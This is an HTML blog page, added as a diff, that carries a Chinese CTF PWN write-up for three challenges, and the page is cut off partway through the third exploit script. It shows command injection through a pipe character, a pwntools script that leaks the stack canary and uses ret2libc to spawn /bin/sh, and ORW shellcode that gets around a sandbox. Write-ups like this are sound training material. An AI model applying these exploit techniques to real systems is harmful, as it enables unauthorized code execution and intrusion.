@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"leeyuxun.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"./public/search.xml"};
+  </script>
+
+  <meta name="description" content="Game">
+<meta property="og:type" content="article">
+<meta property="og:title" content="弱口令安全实验室招新赛PWN-WriteUp">
+<meta property="og:url" content="https://leeyuxun.github.io/%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BPWN-WriteUp.html">
+<meta property="og:site_name" content="Leeyuxun の note">
+<meta property="og:description" content="Game">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127191416.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127191445.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127191536.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127191559.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127191622.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127192338.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127191822.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127191842.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127191906.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127191921.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127192045.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127192108.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127192119.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127192131.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127192258.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127192314.png">
+<meta property="article:published_time" content="2022-11-20T11:11:01.000Z">
+<meta property="article:modified_time" content="2022-11-27T11:57:15.432Z">
+<meta property="article:author" content="李钰璕">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127191416.png">
+
+<link rel="canonical" href="https://leeyuxun.github.io/%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BPWN-WriteUp.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>弱口令安全实验室招新赛PWN-WriteUp | Leeyuxun の note</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163555158-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Leeyuxun の note</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">BUPT | SCSS</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://leeyuxun.github.io/%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BPWN-WriteUp.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="李钰璕">
+      <meta itemprop="description" content="安全学习笔记">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leeyuxun の note">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          弱口令安全实验室招新赛PWN-WriteUp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-11-20 19:11:01" itemprop="dateCreated datePublished" datetime="2022-11-20T19:11:01+08:00">2022-11-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-11-27 19:57:15" itemprop="dateModified" datetime="2022-11-27T19:57:15+08:00">2022-11-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WriteUp/" itemprop="url" rel="index"><span itemprop="name">WriteUp</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="Game"><a href="#Game" class="headerlink" title="Game"></a>Game</h2><span id="more"></span>
+
+<ol>
+<li><p>IDA分析发现需要满足输入的v3==v4，v4是一个srand()确定的随机数，才能跳转到back函数，在back函数里面利用Linux管道符可执行命令。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127191416.png"></p>
+<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127191445.png" style="zoom:75%;"></li>
+<li><p>GDB查看v4的值为0x18c55c46（415587398）</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127191536.png"></p>
+</li>
+<li><p>nc远程连接后输入415587398，然后输入任意IP｜指令，即可执行系统命令，获取flag。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127191559.png"></p>
+</li>
+</ol>
+<h2 id="stackoverflow"><a href="#stackoverflow" class="headerlink" title="stackoverflow"></a>stackoverflow</h2><ol>
+<li><p>checksec发现开启了Canary和NX</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127191622.png"></p>
+</li>
+<li><p>IDA分析发现func中buf和v2两个变量均存在栈溢出。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127192338.png"></p>
+</li>
+<li><p>未发现system函数，提供了glibc，需要ret2libc题目。</p>
+</li>
+<li><p>由于开启了Canary，首先需要第一次输入泄漏Canary，其次需要获取libc基址和binsh的位置。</p>
+</li>
+<li><p>已知func_addr = 0x40128a、popedi_addr = 0x401393、func_ret_addr = 0x4012ff，首先计算libc基地，可通过<code>payload2 = 'A'*(0x40-8) + p64(canary_addr) + p64(0x00) + p64(popedi_addr) + p64(puts_got) + p64(puts_plt) +  p64(func_addr)</code>泄漏puts函数的真实地址，计算libc基址、sys真实地址和binsh真实地址。最后通过<code>payload3 = 'A'*(0x40-8) + p64(canary_addr) + b'bbbbbbbb' + p64(func_ret_addr) + p64(popedi_addr) + p64(binsh_addr) + p64(system_addr)</code>执行<code>system(/bin/sh)</code>。</p>
+</li>
+<li><p>利用脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------- parm zone -------------------------------------------------------#</span></span><br><span class="line">context.terminal    =   [<span class="string">'/usr/bin/tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">context.log_level   =   <span class="string">'debug'</span></span><br><span class="line">context.os          =   <span class="string">'linux'</span></span><br><span class="line">context.arch        =   <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------- functions for quick script --------------------------------------#</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)  <span class="comment"># in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :sh.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :sh.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :sh.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :sh.recvuntil(delims, drop)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :sh.recvuntil(<span class="string">b'\n'</span>).strip(<span class="string">b'\n'</span>)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :sh.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :sh.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :sh.debug(gdbscript=gs, **kwargs)</span><br><span class="line">rm      = <span class="keyword">lambda</span>                    :io.recvuntil(rmflag)</span><br><span class="line">og      = <span class="keyword">lambda</span> path=null          :<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,subprocess.check_output([<span class="string">'one_gadget'</span>,<span class="string">'--raw'</span>,<span class="string">'-f'</span>,libc.path]).decode().strip(<span class="string">'\n'</span>).split(<span class="string">' '</span>))) <span class="keyword">if</span> path == null <span class="keyword">else</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,subprocess.check_output([<span class="string">'one_gadget'</span>,<span class="string">'--raw'</span>,<span class="string">'-f'</span>,path]).decode().strip(<span class="string">'\n'</span>).split(<span class="string">' '</span>)))</span><br><span class="line">clear   = <span class="keyword">lambda</span>                    :os.system(<span class="string">'clear'</span>)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">'\x1b[01;38;5;214m{} = {:#x}\x1b[0m'</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">li      = <span class="keyword">lambda</span> x                  :log.info(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------- func zone -------------------------------------------------------#</span></span><br><span class="line"><span class="comment"># gdb attach</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gdb</span>(<span class="params">cmd=<span class="string">""</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        gdb.attach(sh,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remote or local </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proloc</span>(<span class="params">elf_addr,libc_addr,pro_libc</span>):</span><br><span class="line">    <span class="keyword">global</span> sh, elf, libc, one_ggs</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> :</span><br><span class="line">        ip      =   sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)[<span class="number">0</span>]</span><br><span class="line">        prot    =   sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)[<span class="number">0</span>]</span><br><span class="line">        sh      =   remote(ip,prot)</span><br><span class="line">        libc    =   pro_libc</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sh      =   process(elf_addr) </span><br><span class="line">        elf     =   ELF(elf_addr)</span><br><span class="line">        libc    =   elf.libc    <span class="comment"># libc    =   ELF(libc_addr, checksec=False)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------- code zone -------------------------------------------------------#</span></span><br><span class="line"><span class="comment"># Leak Canary &amp; ret2libc</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># leak canary</span></span><br><span class="line">    sla(<span class="string">'Do you know who first discovered the stack overflow'</span>,<span class="string">b'A'</span>*(<span class="number">0x60</span>-<span class="number">8</span>))</span><br><span class="line">    ru(<span class="string">b'A'</span>*(<span class="number">0x60</span>-<span class="number">8</span>) + <span class="string">b'\n'</span>)</span><br><span class="line">    canary=uu64(r(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">    leak(<span class="string">'canary'</span>,canary)</span><br><span class="line">    <span class="comment"># leak libc_base</span></span><br><span class="line">    puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    func_addr = <span class="number">0x40128a</span></span><br><span class="line">    popedi_addr = <span class="number">0x401393</span></span><br><span class="line">    func_ret_addr = <span class="number">0x4012ff</span></span><br><span class="line">    payload = flat(<span class="string">b'A'</span>*(<span class="number">0x40</span>-<span class="number">8</span>), p64(canary), p64(<span class="number">0x00</span>), p64(popedi_addr), p64(puts_got), p64(puts_plt), p64(func_addr))</span><br><span class="line">    sla(<span class="string">'leave your name:'</span>,payload)</span><br><span class="line">    puts_addr = u64(sh.recvuntil(<span class="string">"\n"</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    leak(<span class="string">'libc_base'</span>,libc_base)</span><br><span class="line">    <span class="comment"># ret2libc getshell</span></span><br><span class="line">    sl(<span class="string">b'A'</span>*(<span class="number">0x60</span>-<span class="number">8</span>))</span><br><span class="line">    ru(<span class="string">b'A'</span>*(<span class="number">0x60</span>-<span class="number">8</span>) + <span class="string">b'\n'</span>)</span><br><span class="line">    canary = uu64(r(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">    leak(<span class="string">'canary'</span>,canary)</span><br><span class="line">    payload = flat(<span class="string">b'A'</span>*(<span class="number">0x40</span>-<span class="number">8</span>), p64(canary), p64(<span class="number">0x00</span>), p64(func_ret_addr), p64(popedi_addr), p64(binsh_addr), p64(system_addr), p64(func_addr))</span><br><span class="line">    sla(<span class="string">'leave your name:'</span>,payload)</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    elf_addr    =   <span class="string">'./stackoverflow'</span>                   <span class="comment"># local ELF</span></span><br><span class="line">    libc_addr   =   <span class="string">'libc.so.6'</span>                         <span class="comment"># local Libc</span></span><br><span class="line">    pro_libc    =   <span class="string">""</span>                                  <span class="comment"># remote Libc</span></span><br><span class="line">    proloc(elf_addr, libc_addr, pro_libc)</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="ssssssn"><a href="#ssssssn" class="headerlink" title="ssssssn"></a>ssssssn</h2><ol>
+<li><p>checksec，保护全开</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127191822.png"></p>
+</li>
+<li><p>开启了沙箱，不允许执行命令。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127191842.png"></p>
+</li>
+<li><p>IDA分析发现是利用mmap函数建立了一个权限为7的内存映射，然后利用read函数读入13字节去执行。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127191906.png"></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127191921.png"></p>
+</li>
+<li><p>由于只允许输入13个字节，因此先利用payload1<code>asm('mov rdx, 0x100')+asm('xor rax, rax')+asm('syscall')</code>扩大从标准输入读取长度，然后进行ORW，payload：<code>b'\x90'*len(payload1) + asm(shellcraft.open("flag")) + asm(shellcraft.read("rax", "rsp", 0x100)) + asm(shellcraft.write(1, "rsp", 0x100))</code>，打开flag文件，rax接收返回的文件描述符，根据rax的文件描述符读取flag写入rsp指向的内存，然后从rsp将flag写入到标准输出。</p>
+</li>
+<li><p>利用脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------- parm zone --------------------------------------------------------#</span></span><br><span class="line">context.terminal    =   [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line">context.log_level   =   <span class="string">'debug'</span></span><br><span class="line">context.os          =   <span class="string">'linux'</span></span><br><span class="line">context.arch        =   <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------- functions for quick script ---------------------------------------#</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)  <span class="comment"># in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :sh.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :sh.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :sh.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :sh.recvuntil(delims, drop)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :sh.recvuntil(<span class="string">b'\n'</span>).strip(<span class="string">b'\n'</span>)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :sh.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :sh.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :sh.debug(gdbscript=gs, **kwargs)</span><br><span class="line">rm      = <span class="keyword">lambda</span>                    :io.recvuntil(rmflag)</span><br><span class="line">og      = <span class="keyword">lambda</span> path=null          :<span class="built_in">list</span>(<span class="built_in">map</span>(<span 